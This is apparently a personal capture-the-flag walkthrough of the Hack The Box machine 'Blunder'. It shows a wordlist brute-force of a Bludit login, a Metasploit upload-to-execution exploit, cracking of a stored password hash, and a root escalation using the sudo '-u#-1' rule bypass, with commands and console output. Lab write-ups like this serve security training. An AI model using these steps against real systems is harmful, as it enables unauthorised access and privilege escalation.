Brute-forcing the login using a password list created in [CeWL](https://github.com/digininja/CeWL)
 * see `passwords.txt` in `/files`
 * use login "fergus" based on `todo.txt`

Used python script in [this blog post](https://blog.void.yt/HTB/Easy/47.html)
 * edit the host to the IP address
 * edit username to "fergus"
 * run `cat password.txt | wc -l`, should have 350 words.
 * Update the range in the script to 350 words in the `for` loop

Found password
User: fergus
Password: RolandDeschain

### User
1. Open `msfconsole` and use the exploit: `linux/http/bludit_upload_images_exec`
2. Run exploit. Should open meterpreter session as user `www-data`
3. I dropped into a shell and used `python3 -c "import pty; pty.spawn('/bin/bash')"` to start an interactive shell because I hate meterpreter in Linux.
4. Dig around the file directories that `www-data` has access to.

Made a separate file for `users`, `hashes`, and `salts`

__Another User__
I thought it was odd we had a login for shaun but not hugo. Checked for other database files and found one at `/var/www/bludit-3.10.0a/bl-content/databases/users.php`
```json
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

So, `hugo` is `admin`

User: admin
hash: faca404fd5c0a31cf1897b823c695c85cffeb98d
salt: none!

Hugo's password is unencrypted. Ran it through JtR and then entered it into [Crackstation.net](http://crackstation.net)
 * Crackstation came thorugh first with the result
 * password: Password120

`su hugo` with the password above

```console
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
```
went to `/home/hugo` and obtained `user.txt`
User flag: bf5+++++++~[takeAbreath]+++++++

### Hugo
Can't SSH as that port isn't open.

Checked `sudo -l`

```Console
hugo@blunder:~/.ssh$ sudo -l
sudo -l
Password: Password210

Sorry, try again.
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Don't have access to `su` with his username
```console
hugo@blunder:~/.ssh$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
Checked this version in `searchsploit`. It is exploitable. Googled 'sudo 1.8.25p1 privilege escalation and [this article](https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/) came up as the first result. It explains the vulnerability:
> ...it appears that this vulnerability allows to bypass Sudo rules that have been setup with the ‚Äú!‚Äù symbol, to specify that a user should not
> be able to run a certain command as root (or any other user). The syntax of Sudo rules is as follows:
> 
>     The user the rule applies to
>     The user/group the command can be executed as
>     The allowed command(s)
> 
> For example:
> 
> `john (jack, jack) cp`
> 
> The above willl mean that the john user can execute the ‚Äúcp‚Äù command as the jack user/group
> 
> Through this exploit, the rule can be bypassed by issuing the following command:
> 
> `sudo -u#-1 [command to execute]`
> 
> This exploit is possible because this version of Sudo doesn‚Äôt validate if the user ID specified using the -u flag actually exists and it
> executes the command using an arbitrary user id with root privileges, and since -u#-1 returns 0, which is the user id of the root user,
> commands are therefore executed as root.

```Console
hugo@blunder:~/Desktop$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password210
root@blunder:/home/hugo/Desktop# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```
